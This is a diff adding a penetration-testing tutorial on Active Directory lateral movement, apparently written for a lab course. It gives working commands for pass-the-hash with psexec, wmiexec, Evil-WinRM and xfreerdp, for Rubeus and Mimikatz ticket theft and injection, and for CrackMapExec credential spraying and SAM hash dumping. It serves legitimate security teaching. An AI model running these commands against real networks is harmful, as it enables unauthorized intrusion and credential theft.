@@ -1,0 +1,143 @@
+---
+title: "Tut03: Lateral Movement"
+---
+
+Lateral movement is the process of using access to one system to gain access to others in the same network. In an Active Directory environment, every machine you reach expands your credential and access options. The goal is to move from a low-value foothold toward high-value targets like domain controllers.
+
+## Common Lateral Movement Techniques
+
+| Technique | Protocol | Requires |
+|-----------|---------|---------|
+| PSExec | SMB | Admin share access + credentials/hash |
+| WinRM / Evil-WinRM | WinRM (5985/5986) | WinRM enabled + credentials/hash |
+| SMB Exec | SMB | Admin rights |
+| WMI Exec | DCOM | Admin rights |
+| Pass-the-Ticket | Kerberos | Valid TGT or TGS |
+| RDP | RDP (3389) | Credentials |
+
+## PSExec (Impacket)
+
+PSExec uploads a service binary over SMB and runs it as SYSTEM. It is noisy but reliable.
+
+```sh
+# With plaintext credentials
+impacket-psexec corp.local/administrator:'Password123'@192.168.1.20
+
+# With NTLM hash (Pass-the-Hash)
+impacket-psexec corp.local/administrator@192.168.1.20 -hashes :64f12cddaa88057e06a81b54e73b949b
+```
+
+## Evil-WinRM
+
+WinRM gives PowerShell remoting over HTTP/HTTPS. It is quieter than PSExec.
+
+```sh
+# With password
+evil-winrm -i 192.168.1.20 -u administrator -p 'Password123'
+
+# With NTLM hash
+evil-winrm -i 192.168.1.20 -u administrator -H 64f12cddaa88057e06a81b54e73b949b
+
+# Upload a file to the target
+upload /path/to/local/file.exe C:\Windows\Temp\file.exe
+
+# Download a file from the target
+download C:\Users\administrator\Documents\secret.txt
+```
+
+## WMI Execution
+
+```sh
+# Execute a command via WMI
+impacket-wmiexec corp.local/administrator:'Password123'@192.168.1.20 "whoami"
+
+# Interactive shell
+impacket-wmiexec corp.local/administrator:'Password123'@192.168.1.20
+```
+
+## Pass-the-Ticket (PTT)
+
+If you have a Kerberos ticket (TGT or TGS), you can import it into your session and authenticate without the underlying password.
+
+### Capturing Tickets (Windows, Rubeus)
+
+```powershell
+# List all tickets in memory
+.\Rubeus.exe triage
+
+# Dump a specific ticket
+.\Rubeus.exe dump /user:administrator /service:krbtgt /nowrap
+
+# Inject a ticket into the current session
+.\Rubeus.exe ptt /ticket:<base64ticket>
+```
+
+### Using Tickets (Linux, Impacket)
+
+```sh
+# Export ticket from Windows with Mimikatz
+sekurlsa::tickets /export
+
+# Convert .kirbi to .ccache
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Set the ticket for use
+export KRB5CCNAME=ticket.ccache
+
+# Authenticate using the ticket
+impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass
+```
+
+## CrackMapExec for Lateral Movement
+
+CME automates credential validation across many hosts simultaneously.
+
+```sh
+# Check which hosts a credential set works on
+crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123' --continue-on-success
+
+# Dump hashes from SAM on every machine where it works
+crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123' --sam
+
+# Execute a command on all accessible hosts
+crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123' -x "net localgroup administrators"
+```
+
+## Using Compromised Credentials Progressively
+
+The typical lateral movement loop:
+
+1. Gain credentials or hash on Machine A.
+2. Use CME to find other machines where those credentials work.
+3. On each new machine, perform situational awareness and harvest new credentials.
+4. Feed new credentials back into step 2.
+5. Repeat until you reach the Domain Controller.
+
+## RDP Lateral Movement
+
+```sh
+# Connect over RDP with credentials
+xfreerdp /u:administrator /p:'Password123' /v:192.168.1.20
+
+# With Pass-the-Hash (requires a special build of xfreerdp)
+xfreerdp /u:administrator /pth:64f12cddaa88057e06a81b54e73b949b /v:192.168.1.20
+```
+
+## Finding Targets for Lateral Movement
+
+Use BloodHound queries to identify the best next hop:
+
+- **Shortest Paths from Owned Principals** — once you mark a host as owned, BloodHound shows what you can reach from there.
+- **Find Computers Where Domain Users Are Local Admins** — shows machines your current user can access directly.
+- **Find Machines Where Specific Users Are Logged In** — helps you target machines where high-value credentials are in memory.
+
+## Task
+
+> **[Task]** Starting from your initial foothold in the lab, use the credentials or hashes you collected to move laterally to at least one additional machine. On the new machine, perform full credential harvesting. Map the path you took and the credentials used at each step.
+
+## Reference
+
+- [ired.team - Lateral Movement](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/lateral-movement)
+- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
+- [CrackMapExec Wiki](https://wiki.porchetta.industries)
+- [Impacket GitHub](https://github.com/fortra/impacket)
